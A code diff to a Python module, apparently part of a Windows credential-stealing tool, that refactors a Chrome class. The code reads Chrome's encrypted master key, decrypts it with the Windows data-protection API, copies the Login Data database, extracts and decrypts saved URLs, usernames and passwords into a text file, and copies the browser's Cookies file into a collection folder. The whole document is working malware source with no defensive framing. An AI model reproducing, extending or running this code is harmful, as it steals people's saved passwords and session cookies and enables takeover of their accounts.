@@ -1,9 +1,8 @@
-import json
-import base64
-import shutil
-
+from json import loads
 from sqlite3 import connect
-from os import environ, sep, path, remove
+from shutil import copyfile
+from base64 import b64decode
+from os import environ, sep, path, remove, mkdir
 
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
@@ -11,22 +10,28 @@ from win32crypt import CryptUnprotectData
 
 class Chrome:
 
-    def __init__(self, storage_path: str, storage_folder: str, errors_print: bool):
+    def __init__(self, storage_path: str, storage_folder: str, browser_folder: str, errors: bool):
 
         self.storage_path = storage_path
         self.storage_folder = storage_folder
-        self.errors_print = errors_print
+        self.browser_folder = browser_folder
+        self.errors = errors
 
         self.state_path = environ['USERPROFILE'] + sep + r'AppData\Local\Google\Chrome\User Data\Local State'
         self.cookies_path = environ['USERPROFILE'] + sep + r'AppData\Local\Google\Chrome\User Data\default\Cookies'
         self.passwords_path = environ['USERPROFILE'] + sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
 
+    def __check_files(self):
+
+        if (path.exists(self.passwords_path)) is True or (path.exists(self.cookies_path)) is True:
+            mkdir(f"{self.storage_path}{self.storage_folder}{self.browser_folder}")
+
     def __get_key(self):
 
         with open(self.state_path, "r", encoding='utf-8') as state:
-            local_state = json.loads(state.read())
+            local_state = loads(state.read())
 
-        return CryptUnprotectData(base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
+        return CryptUnprotectData(b64decode(local_state["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
 
     def __decrypt_password(self, buff, master_key):
 
@@ -40,7 +45,7 @@ class Chrome:
 
     def __write_passwords(self, cursor, master_key):
 
-        with open(f"{self.storage_path}{self.storage_folder}Chrome Passwords.txt", "a", encoding='utf-8') as passwords:
+        with open(f"{self.storage_path}{self.storage_folder}/Chrome/Chrome Passwords.txt", "a", encoding='utf-8') as passwords:
 
             results = cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall()
 
@@ -62,10 +67,12 @@ class Chrome:
 
         try:
 
+            self.__check_files()
+
             if (path.exists(self.passwords_path)) is True:
 
                 master_key = self.__get_key()
-                shutil.copyfile(self.passwords_path, f"{self.storage_path}Chrome.db")
+                copyfile(self.passwords_path, f"{self.storage_path}Chrome.db")
 
                 with connect(f"{self.storage_path}Chrome.db") as connection:
 
@@ -79,13 +86,13 @@ class Chrome:
 
             if (path.exists(self.cookies_path)) is True:
 
-                shutil.copyfile(self.cookies_path, f"{self.storage_path}{self.storage_folder}Chrome Cookies", follow_symlinks=True)
+                copyfile(self.cookies_path, f"{self.storage_path}{self.storage_folder}/Chrome/Chrome Cookies", follow_symlinks=True)
 
             remove(f"{self.storage_path}Chrome.db")
 
         except Exception as e:
 
-            if self.errors_print is True:
+            if self.errors is True:
 
                 print(f"[CHROME]: {repr(e)}")
 
